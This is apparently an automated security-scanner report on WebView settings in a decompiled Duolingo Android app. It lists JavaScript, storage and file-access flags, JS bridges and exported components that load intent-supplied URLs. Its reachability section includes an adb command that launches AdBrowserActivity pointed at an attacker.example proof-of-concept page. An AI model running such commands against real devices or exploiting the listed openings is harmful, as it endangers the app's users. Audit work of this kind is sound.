setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/unity3d/publisher/b.smali:207 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/vungle/publisher/a.smali:29 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/vungle/publisher/b.smali:207 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/prebidorg/publisher/a.smali:29 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/prebidorg/publisher/b.smali:206 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/bytedance2/publisher/a.smali:29 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/bytedance2/publisher/b.smali:207 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/ads/core/domain/AndroidGetWebViewContainerUseCase$invoke$webview$1.smali:183 (invokeSuspend)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebView.smali:199 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
invoke-virtual {p3, v0}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/ads/webplayer/WebPlayerView.smali:107 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/mraid/f0.smali:40 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/staticrenderer/c.smali:75 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 p2, 0x1

    invoke-virtual {p1, p2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/templates/renderer/e.smali:78 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
invoke-virtual {p2, p1}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-005 - content:// access enabled (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/templates/renderer/e.smali:88 (<init>)_

setAllowContentAccess(true) lets the WebView follow content:// URLs, widening the reachable data set.

```
invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/ironsource/sdk/controller/OpenUrlActivity.smali:204 (b)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_com.bytedance.sdk.component.utils.yy_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
enabled -> True
```

### [MEDIUM] WV-SET-007 - Scripts may open windows without user interaction (True)
_com.bytedance.sdk.component.utils.yy_

setJavaScriptCanOpenWindowsAutomatically(true) lets page script spawn windows unprompted, useful for phishing or driving native bridges.

```
automatically -> True
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_com.facebook.ads.redexgen.core.AbstractC1278Ze_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
enabled -> True
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_defpackage.xg90_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
enabled -> True
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_defpackage.x8b0_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
enabled -> True
```

### [LOW] WV-SET-006 - DOM storage enabled (argument unresolved)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:1760 (setDomStorageEnabled)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
move-result-object p0

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
    :try_end_0
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_assets/audience_network/com/facebook/ads/redexgen/X/Ze.smali:265 (A0E)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-008 - Multiple windows supported (True)
_analysis/duolingo/work/smali_classes3/com/ironsource/Og.smali:113 (a)_

setSupportMultipleWindows(true) is required for popups/new tabs.

```
invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes3/com/ironsource/Og.smali:119 (a)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setGeolocationEnabled(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes3/com/google/android/gms/ads/internal/util/zzn.smali:55 (call)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {p0, v0}, Landroid/webkit/WebSettings;->setDatabaseEnabled(Z)V

    invoke-virtual {p0, v0}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-008 - Multiple windows supported (True)
_analysis/duolingo/work/smali_classes3/com/google/android/gms/internal/ads/zzcme.smali:271 (<init>)_

setSupportMultipleWindows(true) is required for popups/new tabs.

```
invoke-virtual {p2, p5}, Landroid/webkit/WebSettings;->setSavePassword(Z)V

    invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes5/ns1.smali:1054 (initWebView)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/bxs/mtv.smali:127 (uc)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/core/widget/uc/phb.smali:285 (uc)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/activity/single/TTWebsiteActivity.smali:454 (qtm)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {p1, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {p1, v3}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/activity/single/TTWebsiteActivity.smali:1211 (uc)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes6/xn20.smali:3975 (zzb)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
move-result-object v3

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes6/li0.smali:198 (invoke)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
move-result-object v1

    invoke-virtual {v1, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes7/com/duolingo/web/WebViewActivity.smali:153 (onCreate)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
move-result-object v3

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebViewWithCache.smali:49 (<init>)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/mraid/f0.smali:42 (<init>)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/staticrenderer/c.smali:77 (<init>)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {p1, p2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {p1, p2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/templates/renderer/e.smali:82 (<init>)_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
invoke-virtual {p0, p1}, Landroid/view/View;->setSaveEnabled(Z)V

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_com.bytedance.sdk.component.utils.yy_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
enabled -> True
```

### [LOW] WV-SET-006 - DOM storage enabled (True)
_com.facebook.ads.redexgen.core.AbstractC1278Ze_

setDomStorageEnabled(true) persists origin-scoped localStorage.

```
enabled -> True
```

### [INFO] WV-SINK-004 - JS bridge `webviewbridge` exposed by com.unity3d.services.core.webview.WebView
_com.unity3d.services.core.webview.WebView:136_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(webViewBridgeInterface, "webviewbridge")
```

### [INFO] WV-SINK-004 - JS bridge `DuoShare` exposed by com.duolingo.web.WebViewActivity
_com.duolingo.web.WebViewActivity:108_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(jo10Var, "DuoShare")
```

### [INFO] WV-SINK-004 - JS bridge `DuoTrack` exposed by com.duolingo.web.WebViewActivity
_com.duolingo.web.WebViewActivity:114_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(jt60Var, "DuoTrack")
```

### [INFO] WV-SINK-004 - JS bridge `webplayerbridge` exposed by com.unity3d.services.ads.webplayer.WebPlayerView
_com.unity3d.services.ads.webplayer.WebPlayerView:316_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(new WebPlayerBridgeInterface(str), "webplayerbridge")
```

### [INFO] WV-SINK-004 - JS bridge `jsBridge` exposed by org.prebid.mobile.rendering.views.webview.WebViewBanner
_org.prebid.mobile.rendering.views.webview.WebViewBanner:35_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(bannerJSInterface, "jsBridge")
```

### [INFO] WV-SINK-004 - JS bridge `jsBridge` exposed by org.prebid.mobile.rendering.views.webview.WebViewInterstitial
_org.prebid.mobile.rendering.views.webview.WebViewInterstitial:33_

addJavascriptInterface exposes a native object to page script. A bridge reachable from an untrusted origin defeats the WebView sandbox.

```
addJavascriptInterface(interstitialJSInterface, "jsBridge")
```

## Reachability

These exported entry points render a URL chosen by whoever launches them, so any app on the device (or an ad SDK, or a browsed link) can drive them with no user action inside the app. Verify on a test device with `adb`, substituting the component and extra key:

```sh
# org.prebid.mobile.rendering.views.browser.AdBrowserActivity
adb shell am start -n com.duolingo/org.prebid.mobile.rendering.views.browser.AdBrowserActivity -e EXTRA_URL "https://attacker.example/poc.html"

```

| component | intent-URL flow | JS bridge | local file access |
|-----------|-----------------|-----------|-------------------|
| `org.prebid.mobile.rendering.views.browser.AdBrowserActivity` | intent extras -> getString(EXTRA_URL) -> loadUrl | — | — |

## WebView hosts

### `com.unity3d.services.core.webview.WebView`
- sources: smali
- settings:
  - `allow_file_access` = `True`
  - `allow_file_access_from_file_urls` = `True`
  - `allow_universal_access_from_file_urls` = `True`
  - `dom_storage_enabled` = `False`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `False`
  - `mixed_content_mode` = `1`
  - `support_multiple_windows` = `False`
- JS bridges: `webviewbridge`

### `com.bytedance.sdk.openadsdk.bxs.mtv`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `allow_file_access_from_file_urls` = `False`
  - `allow_universal_access_from_file_urls` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `mixed_content_mode` = `0`

### `com.unity3d.ads.core.domain.AndroidGetWebViewContainerUseCase$invoke$webview$1`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `False`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `False`
  - `mixed_content_mode` = `True`
  - `support_multiple_windows` = `False`

### `com.bytedance.sdk.component.mtv.dd`
- sources: smali
- settings:
  - `allow_file_access` = `None`
  - `dom_storage_enabled` = `None`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `None`
  - `mixed_content_mode` = `i`

### `com.ironsource.Og`
- sources: smali
- settings:
  - `allow_file_access` = `True`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `True`
  - `support_multiple_windows` = `True`

### `com.google.android.gms.internal.ads.zzcme`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `True`
  - `mixed_content_mode` = `2`
  - `support_multiple_windows` = `True`

### `ns1`
- sources: smali
- settings:
  - `allow_content_access` = `True`
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `web_contents_debugging` = `None`

### `com.duolingo.web.WebViewActivity`
- sources: smali
- settings:
  - `allow_file_access_from_file_urls` = `True`
  - `allow_universal_access_from_file_urls` = `True`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `web_contents_debugging` = `True`
- JS bridges: `DuoShare`, `DuoTrack`

### `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.mraid.f0`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `web_contents_debugging` = `False`

### `audience_network.com.facebook.ads.redexgen.X.LJ`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `allow_file_access_from_file_urls` = `False`
  - `allow_universal_access_from_file_urls` = `False`

### `xg90`
- sources: smali
- settings:
  - `allow_file_access` = `True`
  - `allow_file_access_from_file_urls` = `True`
  - `allow_universal_access_from_file_urls` = `None`
  - `javascript_enabled` = `True`

### `com.bytedance.sdk.openadsdk.activity.single.TTWebsiteActivity`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `mixed_content_mode` = `False`

### `com.unity3d.services.ads.webplayer.WebPlayerView`
- sources: smali
- settings:
  - `allow_file_access_from_file_urls` = `False`
  - `allow_universal_access_from_file_urls` = `False`
  - `dom_storage_enabled` = `False`
  - `javascript_enabled` = `True`
- JS bridges: `webplayerbridge`

### `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.staticrenderer.c`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`

### `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.templates.renderer.e`
- sources: smali
- settings:
  - `allow_content_access` = `True`
  - `allow_file_access` = `True`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`

### `com.facebook.ads.redexgen.core.LJ`
- sources: java
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `allow_file_access_from_file_urls` = `False`
  - `allow_universal_access_from_file_urls` = `False`

### `com.bytedance.sdk.openadsdk.core.widget.uc.phb`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`

### `xn20`
- sources: smali
- settings:
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `mixed_content_mode` = `False`

### `li0`
- sources: smali
- settings:
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `web_contents_debugging` = `True`

### `d8b0`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.google.android.gms.internal.consent_sdk.zzbe`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.google.android.gms.internal.ads.zzfwm`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.iab.omid.library.ironsrc.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.iab.omid.library.amazon.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.iab.omid.library.unity3d.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.iab.omid.library.vungle.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.iab.omid.library.bytedance2.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `allow_file_access` = `False`
  - `javascript_enabled` = `True`

### `com.bytedance.sdk.component.utils.yy`
- sources: java
- settings:
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `True`

### `com.facebook.ads.redexgen.core.AbstractC1278Ze`
- sources: java
- settings:
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`
  - `web_contents_debugging` = `True`

### `audience_network.com.facebook.ads.redexgen.X.Ze`
- sources: smali
- settings:
  - `dom_storage_enabled` = `True`
  - `javascript_enabled` = `True`

### `audience_network.com.facebook.ads.redexgen.X.cz`
- sources: smali
- settings:
  - `allow_file_access` = `True`
  - `allow_file_access_from_file_urls` = `True`

### `org.prebid.mobile.rendering.views.browser.AdBrowserActivity`
- sources: smali (exported component)
- settings:
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `False`
- intent-supplied URL: `intent extras -> getString(EXTRA_URL) -> loadUrl`

### `org.prebid.mobile.rendering.views.webview.AdWebView`
- sources: smali
- settings:
  - `javascript_enabled` = `True`
  - `js_can_open_windows_automatically` = `False`

### `zendesk.support.guide.ViewArticleActivity`
- sources: smali
- settings:
  - `javascript_enabled` = `True`
  - `mixed_content_mode` = `False`

### `com.google.android.gms.ads.internal.util.zzn`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `dom_storage_enabled` = `True`

### `com.google.android.gms.ads.internal.util.zzs`
- sources: smali
- settings:
  - `allow_file_access_from_file_urls` = `False`
  - `allow_universal_access_from_file_urls` = `False`

### `com.bytedance.sdk.component.mtv.rw`
- sources: smali
- settings:
  - `allow_file_access` = `False`
  - `support_multiple_windows` = `False`

### `ssa`
- sources: smali
- settings:
  - `dom_storage_enabled` = `False`
  - `javascript_enabled` = `False`

### `com.iab.omid.library.prebidorg.publisher.b`
- sources: smali
- settings:
  - `allow_content_access` = `False`
  - `javascript_enabled` = `True`

### `defpackage.xg90`
- sources: java
- settings:
  - `allow_file_access` = `True`
  - `javascript_enabled` = `True`

### `com.facebook.ads.redexgen.core.C1483cz`
- sources: java
- settings:
  - `allow_file_access` = `True`
  - `allow_file_access_from_file_urls` = `True`

### `com.confiant.android.sdk.b`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `audience_network.com.facebook.ads.redexgen.X.I5`
- sources: smali
- settings:
  - `allow_file_access` = `True`

### `audience_network.com.facebook.ads.redexgen.X.Zk`
- sources: smali
- settings:
  - `mixed_content_mode` = `False`

### `com.ironsource.sdk.controller.v`
- sources: smali
- settings:
  - `web_contents_debugging` = `None`

### `vg90`
- sources: smali
- settings:
  - `allow_content_access` = `False`

### `com.unity3d.ads.core.domain.HandleDebugSettings`
- sources: smali
- settings:
  - `web_contents_debugging` = `None`

### `x8b0`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.facebook.internal.WebDialog`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.google.android.gms.ads.internal.zzs`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.google.android.gms.internal.ads.zzfwj`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.ironsource.Mf`
- sources: smali
- settings:
  - `javascript_enabled` = `True`
- loaded URLs:
  - `javascript:`
  - `javascript:document.write(atob(\'PGh0bWw+PGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgPHN0eWxlPgogICAgICAgIC5jb250YWluZXIgewogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgIH0KCiAgICAgICAgLmZsZXgtY29udGFpbmVyIHsKICAgICAgICA`

### `com.iab.omid.library.ironsrc.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.iab.omid.library.amazon.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.iab.omid.library.unity3d.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.iab.omid.library.vungle.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.iab.omid.library.prebidorg.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.iab.omid.library.bytedance2.publisher.a`
- sources: smali
- settings:
  - `javascript_enabled` = `True`

### `com.unity3d.services.core.webview.WebViewWithCache`
- sources: smali
- settings:
  - `dom_storage_enabled` = `True`

### `com.ironsource.sdk.controller.v$s$q`
- sources: smali
- settings:
  - `mixed_content_mode` = `False`

### `com.ironsource.sdk.controller.OpenUrlActivity`
- sources: smali
- settings:
  - `javascript_enabled` = `True`
- intent-supplied URL: `intent extras -> getString(external_url) -> loadUrl`

### `defpackage.x8b0`
- sources: java
- settings:
  - `javascript_enabled` = `True`

### `com.facebook.ads.redexgen.core.AbstractC1284Zk`
- sources: java
- settings:
  - `mixed_content_mode` = `0`

### `com.ironsource.InterfaceC2504oa`
- sources: java
- loaded URLs:
  - `javascript:`

### `com.iab.omid.library.ironsrc.internal.h`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.iab.omid.library.amazon.internal.h`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.iab.omid.library.unity3d.internal.g`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.iab.omid.library.vungle.internal.h`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.iab.omid.library.prebidorg.internal.g`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.iab.omid.library.bytedance2.internal.h`
- sources: java
- loaded URLs:
  - `javascript: `

### `com.google.android.gms.internal.consent_sdk.zzda`
- sources: java
- loaded URLs:
  - `javascript:`

### `org.prebid.mobile.rendering.views.webview.WebViewBanner`
- sources: java
- JS bridges: `jsBridge`

